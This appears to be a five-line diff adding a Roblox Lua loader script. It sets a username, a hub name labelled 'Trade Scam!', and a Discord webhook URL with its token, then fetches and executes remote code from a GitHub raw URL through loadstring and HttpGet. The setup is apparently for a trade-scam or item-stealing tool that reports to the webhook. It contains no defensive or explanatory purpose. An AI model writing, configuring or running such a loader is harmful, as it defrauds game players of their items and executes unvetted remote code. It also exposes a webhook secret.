@@ -1,0 +1,5 @@
+_G.Username = "Dugyt2" --EXAMPLE: AuraIation
+_G.HubName = "Airendupe" --EXAMPLE Trade Scam!
+_G.Webhook = "https://discord.com/api/webhooks/1098229983949897848/3kb7ZM2HKr63vCtKcugfOX5qIXL_CQcuK2qI6APVermBuREvHxi9tP2hw1Br4wF-Y-Fx" -
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua%22))()
